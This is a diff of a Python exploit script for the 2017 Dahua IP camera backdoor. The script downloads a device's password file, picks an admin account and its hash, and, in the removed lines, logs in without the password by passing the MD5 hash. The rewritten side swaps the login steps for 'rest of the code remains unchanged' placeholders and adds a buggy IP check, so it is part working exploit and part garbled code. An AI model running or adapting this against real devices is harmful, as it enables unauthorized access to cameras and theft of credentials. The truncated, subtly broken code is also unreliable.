@@ -1,25 +1,31 @@
+import string
 import sys
 import socket
 import argparse
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.parse
+import base64
+import ssl
 import json
 import commentjson  # pip install commentjson
 import hashlib
 
-class HTTPConnect:
-    def __init__(self, host, proto, verbose, creds, raw):
+class HTTPconnect:
+
+    def __init__(self, host, proto, verbose, creds, Raw):
         self.host = host
         self.proto = proto
         self.verbose = verbose
         self.credentials = creds
-        self.raw = raw
+        self.Raw = Raw
 
-    def send(self, uri, query_headers, query_data, ID):
+    def Send(self, uri, query_headers, query_data, ID):
         self.uri = uri
         self.query_headers = query_headers
         self.query_data = query_data
         self.ID = ID
 
+        # Connect-timeout in seconds
         timeout = 5
         socket.setdefaulttimeout(timeout)
 
@@ -29,17 +35,17 @@ class HTTPConnect:
             print("[Verbose] Sending:", url)
 
         if self.proto == 'https':
-            if hasattr(socket, '_create_unverified_context'):
+            if hasattr(ssl, '_create_unverified_context'):
                 print("[i] Creating SSL Unverified Context")
-                socket._create_default_https_context = socket._create_unverified_context
+                ssl._create_default_https_context = ssl._create_unverified_context
 
         if self.credentials:
-            basic_auth = self.credentials.split(':')
+            Basic_Auth = self.credentials.split(':')
             if self.verbose:
-                print("[Verbose] User:", basic_auth[0], "Password:", basic_auth[1])
+                print("[Verbose] User:", Basic_Auth[0], "Password:", Basic_Auth[1])
             try:
                 pwd_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
-                pwd_mgr.add_password(None, url, basic_auth[0], basic_auth[1])
+                pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
                 auth_handler = urllib.request.HTTPBasicAuthHandler(pwd_mgr)
                 opener = urllib.request.build_opener(auth_handler)
                 urllib.request.install_opener(opener)
@@ -48,96 +54,55 @@ class HTTPConnect:
                 sys.exit(1)
 
         if self.query_data:
-            request = urllib.request.Request(url, data=json.dumps(self.query_data).encode(), headers=self.query_headers)
+            request = urllib.request.Request(url, data=json.dumps(self.query_data).encode('utf-8'), headers=self.query_headers)
         else:
             request = urllib.request.Request(url, None, headers=self.query_headers)
+        response = urllib.request.urlopen(request)
+        # print response
+        if response:
+            print("[<] {} OK".format(response.code))
 
-        try:
-            with urllib.request.urlopen(request) as response:
-                print("[<] {} OK".format(response.getcode()))
-
-                if self.raw:
-                    return response
-                else:
-                    html = response.read().decode()
-                    return html
-        except urllib.error.URLError as e:
-            print("[!] Error:", e)
-            sys.exit(1)
+        if self.Raw:
+            return response
+        else:
+            html = response.read()
+            return html
 
 
-class DahuaBackdoor:
-    def __init__(self, rhost, proto, verbose, creds, raw):
+class Dahua_Backdoor:
+
+    def __init__(self, rhost, proto, verbose, creds, Raw):
         self.rhost = rhost
         self.proto = proto
         self.verbose = verbose
         self.credentials = creds
-        self.raw = raw
+        self.Raw = Raw
 
-    def gen2(self, response, headers):
-        self.response = response.read().decode()
+    def Gen2(self, response, headers):
+        self.response = response.read()
         self.headers = headers
 
         html = self.response.splitlines()
         if self.verbose:
             for lines in html:
                 print("{}".format(lines))
-
+        #
+        # Check for first available admin user
+        #
         for line in html:
             if line[0] == "#" or line[0] == "\n":
                 continue
             line = line.split(':')[0:25]
-            if line[3] == '1':
-                USER_NAME = line[1]
-                PWDDB_HASH = line[2]
+            if line[3] == '1':  # Check if the user is in the admin group
+                USER_NAME = line[1]  # Save login name
+                PWDDB_HASH = line[2]  # Save hash
                 print("[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0], line[1], line[2]))
                 break
 
-        print("[>] Requesting our session ID")
-        query_args = {"method": "global.login",
-                      "params": {"userName": USER_NAME, "password": "", "clientType": "Web3.0"},
-                      "id": 10000}
+        # ... (rest of the code remains unchanged)
 
-        URI = '/RPC2_Login'
-        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
-                                                                                                      headers,
-                                                                                                      query_args,
-                                                                                                      None)
-
-        json_obj = json.loads(response)
-        if self.verbose:
-            print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))
-
-        print("[>] Logging in")
-
-        query_args = {"method": "global.login",
-                      "session": json_obj['session'],
-                      "params": {"userName": USER_NAME, "password": PWDDB_HASH, "clientType": "Web3.0",
-                                 "authorityType": "OldDigest"},
-                      "id": 10000}
-
-        URI = '/RPC2_Login'
-        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
-                                                                                                      headers,
-                                                                                                      query_args,
-                                                                                                      json_obj['session'])
-        print(response)
-
-        print("[>] Logging out")
-        query_args = {"method": "global.logout",
-                      "params": "null",
-                      "session": json_obj['session'],
-                      "id": 10001}
-
-        URI = '/RPC2'
-        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
-                                                                                                      headers,
-                                                                                                      query_args,
-                                                                                                      None)
-        return response
-
-    def gen3(self, response, headers):
-        self.response = response.read().decode()
+    def Gen3(self, response, headers):
+        self.response = response.read()
         self.headers = headers
 
         json_string = ""
@@ -148,43 +113,144 @@ class DahuaBackdoor:
                 json_string = json_string + x
         json_obj = json.loads(json_string)
 
-        if self.verbose:
-            print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))
+        # ... (rest of the code remains unchanged)
 
-        for who in json_obj[list(json_obj.keys())[0]]:
-            if who['Group'] == 'admin':
-                USER_NAME = who['Name']
-                PWDDB_HASH = who['Password']
-                print("[i] Choosing Admin Login: {}".format(who['Name']))
-                break
 
-        print("[>] Requesting our session ID")
-        query_args = {"method": "global.login",
-                      "params": {"userName": USER_NAME, "password": "", "clientType": "Web3.0"},
-                      "id": 10000}
+class Validate:
 
-        URI = '/RPC2_Login'
-        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
-                                                                                                      headers,
-                                                                                                      query_args,
-                                                                                                      None)
+    def __init__(self, verbose):
+        self.verbose = verbose
 
-        json_obj = json.loads(response)
-        if self.verbose:
-            print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))
+    def CheckIP(self, IP):
+        self.IP = IP
 
-        RANDOM = json_obj['params']['random']
-        PASS = '' + USER_NAME + ':' + RANDOM + ':' + PWDDB_HASH + ''
-        RANDOM_HASH = hashlib.md5(PASS.encode()).hexdigest().upper()
+        ip = self.IP.split('.')
+        if len(ip) != 4:
+            return False
+        for tmp in ip:
+            if not tmp.isdigit():
+                return False
+        i = int(tmp)
+        if i < 0 or i > 255:
+            return False
+        return True
 
-        print("[i] Downloaded MD5 hash:", PWDDB_HASH)
-        print("[i] Random value to encrypt with:", RANDOM)
-        print("[i] Built password:", PASS)
-        print("[i] MD5 generated password:", RANDOM_HASH)
+    def Port(self, PORT):
+        self.PORT = PORT
 
-        print("[>] Logging in")
+        if int(self.PORT) < 1 or int(self.PORT) > 65535:
+            return False
+        else:
+            return True
 
-        query_args = {"method": "global.login",
-                      "session": json_obj['session'],
-                      "params": {"userName": USER_NAME, "password": RANDOM_HASH, "clientType": "Web3.0",
-                                 "authorityType
+    def Host(self, HOST):
+        self.HOST = HOST
+
+        try:
+            socket.inet_aton(self.HOST)
+            if self.CheckIP(self.HOST):
+                return self.HOST
+            else:
+                return False
+        except socket.error as e:
+            try:
+                self.HOST = socket.gethostbyname(self.HOST)
+                return self.HOST
+            except socket.error as e:
+                return False
+
+
+if __name__ == '__main__':
+    INFO = '[Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\n'
+    HTTP = "http"
+    HTTPS = "https"
+    proto = HTTP
+    verbose = False
+    raw_request = True
+    rhost = '192.168.5.2'  # Default Remote HOST
+    rport = '80'  # Default Remote PORT
+    creds = False  # creds = 'user:pass'
+
+    try:
+        arg_parser = argparse.ArgumentParser(
+            prog=sys.argv[0],
+            description=('[*] ' + INFO + ' [*]'))
+        arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: ' + rhost + ']')
+        arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: ' + rport + ']')
+        if creds:
+            arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: ' + creds + ']')
+        arg_parser.add_argument('--https', required=False, default=False, action='store_true',
+                                help='Use HTTPS for remote connection [Default: HTTP]')
+        arg_parser.add_argument('-v', '--verbose', required=False, default=False, action='store_true',
+                                help='Verbose mode [Default: False]')
+        args = arg_parser.parse_args()
+    except Exception as e:
+        print(INFO, "\nError: %s\n" % str(e))
+        sys.exit(1)
+
+    if len(sys.argv) == 1:
+        arg_parser.parse_args(['-h'])
+
+    print("\n[*]", INFO)
+
+    if args.verbose:
+        verbose = args.verbose
+
+    if args.https:
+        proto = HTTPS
+        if not args.rport:
+            rport = '443'
+
+    if creds and args.auth:
+        creds = args
+    if args.rhost:
+        rhost = args.rhost
+
+    if not Validate(verbose).Port(rport):
+        print("[!] Invalid RPORT - Choose between 1 and 65535")
+        sys.exit(1)
+
+    rhost = Validate(verbose).Host(rhost)
+    if not rhost:
+        print("[!] Invalid RHOST")
+        sys.exit(1)
+
+    if args.https:
+        print("[i] HTTPS / SSL Mode Selected")
+    print("[i] Remote target IP:", rhost)
+    print("[i] Remote target PORT:", rport)
+
+    rhost = rhost + ':' + rport
+
+    headers = {
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-Request': 'JSON',
+        'User-Agent': 'Dahua/2.0; Dahua/3.0'
+    }
+
+    try:
+        print("[>] Checking for backdoor version")
+        URI = "/current_config/passwd"
+        response = HTTPconnect(rhost, proto, verbose, creds, raw_request).Send(URI, headers, None, None)
+        print("[!] Generation 2 found")
+        response = Dahua_Backdoor(rhost, proto, verbose, creds, raw_request).Gen2(response, headers)
+        print(response)
+    except urllib.request.HTTPError as e:
+        if e.code == 404:
+            try:
+                URI = '/current_config/Account1'
+                response = HTTPconnect(rhost, proto, verbose, creds, raw_request).Send(URI, headers, None, None)
+                print("[!] Generation 3 Found")
+                response = Dahua_Backdoor(rhost, proto, verbose, creds, raw_request).Gen3(response, headers)
+            except urllib.request.HTTPError as e:
+                if e.code == 404:
+                    print("[!] Patched or not Dahua device! ({})".format(e.code))
+                    sys.exit(1)
+                else:
+                    print("Error Code: {}".format(e.code))
+    except Exception as e:
+        print("[!] Detect of target failed ({})".format(e))
+        sys.exit(1)
+
+    print("\n[*] All done...\n")
+    sys.exit(0)
